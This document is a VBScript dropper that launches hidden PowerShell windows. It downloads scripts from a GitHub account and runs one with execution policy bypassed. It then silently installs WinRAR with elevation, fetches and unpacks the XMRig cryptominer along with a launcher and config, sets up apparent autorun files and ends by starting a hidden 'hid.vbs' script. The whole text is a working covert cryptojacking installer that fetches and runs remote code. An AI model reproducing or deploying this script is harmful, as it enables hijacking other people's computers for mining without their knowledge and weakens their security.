Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1 -OutFile C:\configure_system.ps1", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/AUTORUN_SETUP.cmd -OutFile C:\AUTORUN_SETUP.cmd", 0, True
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\configure_system.ps1", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe -OutFile C:\winrar-x64-701.exe", 0, True
objShell.Run "powershell.exe -Command Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\xmrig-6.22.2-gcc-win64.zip", 0, True
objShell.Run "powershell.exe -Command & 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\xmrig-6.22.2-gcc-win64.zip' 'C:\'", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/COINRUN.cmd -OutFile C:\COINRUN.cmd", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/config.json -OutFile C:\config.json", 0, True
objShell.Run "powershell.exe -Command Copy-Item -Path C:\COINRUN.cmd -Destination C:\xmrig-6.22.2\COINRUN.cmd -Force", 0, True
objShell.Run "powershell.exe -Command Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force", 0, True
objShell.Run "wscript.exe C:\hid.vbs", 0, True
objShell.Run "powershell.exe exit", 0, False
